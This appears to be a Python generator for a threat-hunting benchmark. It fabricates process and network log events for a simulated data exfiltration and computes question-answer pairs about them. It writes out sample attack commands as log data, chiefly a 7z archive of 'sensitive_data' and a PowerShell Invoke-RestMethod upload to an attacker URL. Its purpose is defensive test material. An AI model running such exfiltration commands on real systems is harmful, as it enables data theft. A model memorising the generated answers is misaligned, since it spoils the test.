import random
from datetime import datetime, timedelta
from faker import Faker
import polars as pl
from tqdm import tqdm
from ..utils import (
    generate_device_process_events,
    generate_outbound_network_events,
)

class ExfiltrationOverWebServiceAttackGenerator:
    def __init__(self, benign_data, victims, attacker, last_scan_time):
        self.fake = Faker()
        self.benign_data = benign_data
        self.last_scan_time = last_scan_time
        self.victims = victims
        self.exfil_server_ip = attacker["ExternalServerIP"]
        self.exfil_url = attacker['ExternalServerName']
        self.data = None
        self.exfil_file = self.fake.file_name(extension="zip")  

    def generate_exfiltration_over_web_service_attack(self):
        data = {}
        process_events = []
        network_events = []

        campaign_time = self.fake.date_time_between(
            start_date=self.last_scan_time, 
            end_date=datetime.today()
        )
        compromised_victims = set()
        victim_selected = False

        for victim in tqdm(self.victims.iter_rows(named=True),
                              desc="Generating exfiltration over web service events for victims"):
            if random.random() < 1.0 or not victim_selected:
                victim_selected = True
                compromised_victims.add(victim["AccountUpn"])

                user_devices = self.benign_data["device_info"].filter(
                    pl.col("LoggedOnUsers").str.contains(victim["AccountUpn"])
                )
                user_device = user_devices.sample(n=1).to_dicts()[0]
                
                compress_time = campaign_time + timedelta(seconds=random.randint(0, 600))
                compress_command = f"7z.exe a -tzip {self.exfil_file} C:\\sensitive_data"
                compress_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=compress_time,
                    fake=self.fake,
                    file_name=self.exfil_file,
                    process_command_line=compress_command,
                )
                process_events.append(compress_event)

                upload_time = compress_time + timedelta(seconds=random.randint(100, 300))
                upload_command = f"powershell.exe -Command \"Invoke-RestMethod -Uri {self.exfil_url} -Method Post -InFile {self.exfil_file}\""
                upload_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=upload_time,
                    fake=self.fake,
                    file_name=self.exfil_file,
                    process_command_line=upload_command,
                )
                process_events.append(upload_event)

                net_time = upload_time + timedelta(seconds=random.randint(50, 200))
                net_event = generate_outbound_network_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=net_time,
                    fake=self.fake,
                    remote_ip=self.exfil_server_ip,
                    remote_url=self.exfil_url,
                    remote_port=random.randint(1024, 65535)
                )
                network_events.append(net_event)

        expected_process_cols = self.benign_data["device_process_events"].columns if "device_process_events" in self.benign_data else []
        expected_network_cols = self.benign_data["device_network_events"].columns if "device_network_events" in self.benign_data else []
        proc_df = (
            pl.DataFrame(process_events).sort("Timestamp")
            if process_events
            else pl.DataFrame({col: [] for col in expected_process_cols})
        )
        net_df = (
            pl.DataFrame(network_events).sort("Timestamp")
            if network_events
            else pl.DataFrame({col: [] for col in expected_network_cols})
        )
        data["device_process_events"] = proc_df
        data["device_network_events"] = net_df
        self.data = data

        def get_max_timestamp(df, fallback):
            if "Timestamp" in df.columns and df.height > 0:
                return df["Timestamp"].max()
            return fallback

        last_event_time = max(
            get_max_timestamp(data["device_process_events"], self.last_scan_time),
            get_max_timestamp(data["device_network_events"], self.last_scan_time)
        )
        compromised_victims = self.victims.filter(pl.col("AccountUpn").is_in(compromised_victims)) if compromised_victims else pl.DataFrame()

        return data, compromised_victims, last_event_time

    def generate_question_answer_pairs(self):
        all_process_events = pl.concat(
            [self.benign_data["device_process_events"], self.data["device_process_events"]]
        )

        all_network_events = pl.concat(
            [self.benign_data["device_network_events"], self.data["device_network_events"]]
        )

        questions = []
        answers = []

        Q1 = "How many unique devices were involved in the web service exfiltration events?"
        Q1_answer_df = (
            all_network_events
            .filter(pl.col("RemoteUrl") == self.exfil_url)
            .select(pl.col("DeviceId").n_unique())
        )
        Q1_answer = Q1_answer_df.to_series()[0] if Q1_answer_df.height > 0 else 0
        questions.append(Q1)
        answers.append(Q1_answer)

        Q2 = "What is the name of the exfiltrated file?"
        subset_df = all_process_events.filter(
            pl.col("ProcessCommandLine").str.contains("7z.exe a")
        )
        if subset_df.height > 0:
            Q2_answer = subset_df.select("FileName").item(0, 0)
        else:
            Q2_answer = "N/A"
        questions.append(Q2)
        answers.append(Q2_answer)

        Q3 = "Which compression tool was used during the exfiltration?"
        comp_cmd_df = all_process_events.filter(
            pl.col("ProcessCommandLine").str.contains("7z.exe")
        ).select("ProcessCommandLine")
        if comp_cmd_df.height > 0:
            Q3_answer = comp_cmd_df.item(0, 0).split()[0]
        else:
            Q3_answer = "N/A"
        questions.append(Q3)
        answers.append(Q3_answer)

        Q4 = "What is the remote web service endpoint used for exfiltration?"
        net_subset_df = all_network_events.filter(pl.col("RemoteUrl") == self.exfil_url)
        if net_subset_df.height > 0:
            Q4_answer = net_subset_df.select("RemoteUrl").item(0, 0)
        else:
            Q4_answer = "N/A"
        questions.append(Q4)
        answers.append(Q4_answer)

        Q5 = "Which tool was used to upload (exfiltrate) the file via the web service?"
        upload_subset_df = all_process_events.filter(
            pl.col("ProcessCommandLine").str.contains("Invoke-RestMethod")
        )
        if upload_subset_df.height > 0:
            Q5_answer = upload_subset_df.select("ProcessCommandLine").item(0, 0).split()[0]
        else:
            Q5_answer = "N/A"
        questions.append(Q5)
        answers.append(Q5_answer)

        Q6 = "What is the average delay (in seconds) between the compression and web service upload events for each victim?"
        delays = []
        malicious_process = self.data["device_process_events"]
        for group in malicious_process.partition_by("DeviceId"):
            group = group.sort("Timestamp")
            compress = group.filter(pl.col("ProcessCommandLine").str.contains("7z.exe a"))
            upload = group.filter(pl.col("ProcessCommandLine").str.contains("Invoke-RestMethod"))
            if compress.height > 0 and upload.height > 0:
                first_compress = compress.select("Timestamp").item(0, 0)
                first_upload = upload.select("Timestamp").item(0, 0)
                delays.append((first_upload - first_compress).total_seconds())
        Q6_answer = sum(delays)/len(delays) if delays else "N/A"
        questions.append(Q6)
        answers.append(Q6_answer)

        Q8 = "What is the HTTP method used for the web service exfiltration upload?"
        if upload_subset_df.height > 0:
            upload_cmd = upload_subset_df.select("ProcessCommandLine").item(0, 0)
            parts = upload_cmd.split()
            try:
                method_index = parts.index("-Method")
                Q8_answer = parts[method_index + 1].strip('"').upper()
            except (ValueError, IndexError):
                Q8_answer = "N/A"
        else:
            Q8_answer = "N/A"
        questions.append(Q8)
        answers.append(Q8_answer)

        qa_df = pl.DataFrame({"Question": questions, "Answer": answers}, strict=False)
        return qa_df